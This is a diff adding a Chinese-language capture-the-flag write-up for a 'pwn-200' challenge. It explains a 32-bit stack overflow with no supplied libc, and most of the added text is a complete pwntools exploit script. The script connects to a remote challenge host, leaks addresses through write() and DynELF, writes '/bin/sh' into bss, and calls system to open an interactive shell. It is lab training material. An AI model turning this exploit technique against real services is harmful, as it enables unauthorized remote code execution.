@@ -288,3 +288,73 @@ cyberpeace{2c3475a0a0745a90418c2694c7dc54e4}
 sh: 1: : Permission denied
 1) Set a time format.
 ```
+
+### 9. pwn-200
+题目：栈无。
+
+思路：这道题目没有提供libc，需要通过远程泄露的方式查找system函数地址。
+
+通过栈溢出构造leak函数，然后使用DynELF查找system函数地址，再使用read函数将/bin/sh写入bss段，最后调用system获取flag。leak函数由于需要重入，因此leak函数需要一个正常的返回地址，另外读写/bin/sh字符串的时候也需要可重入，这里选的是溢出点所在的函数，但是在调用system函数时始终报错，后来将调用system之前的一次返回地址改成main函数，然后就可以正确调用system了，网上查到类似的问题说是可能由于环境变量被覆盖了。。。
+
+代码如下：
+```python
+from pwn import *
+
+sh = remote('220.249.52.133', 59273)
+elf = ELF('bed0c68697f74e649f3e1c64ff7838b8')
+
+BUFLEN = 0x6c
+
+def makePayload32(funcAddr, arg0, arg1, arg2, funcRet):
+    payload = b'A' * BUFLEN
+    payload += b'B' * 4
+    payload += p32(funcAddr)
+    payload += p32(funcRet)
+    payload += p32(arg0)
+    payload += p32(arg1)
+    payload += p32(arg2)
+    return payload
+
+vulFun = 0x8048484
+main = 0x80484be
+
+def leak(addr):
+    payload = makePayload32(elf.plt['write'], 1, addr, 4, vulFun)
+    sh.sendline(payload)
+    data = sh.recv(4)
+    # print(data)
+    return data
+
+data = sh.recvuntil('~!\n')
+print(data)
+d = DynELF(leak, elf=elf)
+system = d.lookup('system', 'libc')
+log.success("system addr = " + hex(system))
+
+bss = elf.bss() + 0x100
+binStr = b'/bin/sh\x00'
+payload = makePayload32(elf.plt['read'], 0, bss, len(binStr) + 1, vulFun)
+sh.sendline(payload)
+sleep(1)
+sh.sendline(binStr)
+sleep(1)
+
+# 这个函数结束后返回到main，否则system没法正确执行
+payload = makePayload32(elf.plt['write'], 1, bss, len(binStr), main)
+sh.sendline(payload)
+sleep(1)
+data = sh.recv(len(binStr))
+print(data)
+if data == binStr:
+    log.success('write /bin/sh ok!')
+else:
+    log.error('write /bin/sh error')
+
+# 由于这里是从main进入的，先接收程序输出
+data = sh.recvuntil('~!\n')
+print(data)
+
+payload = makePayload32(system, bss, 1, 1, vulFun)
+sh.sendline(payload)
+sh.interactive()
+```
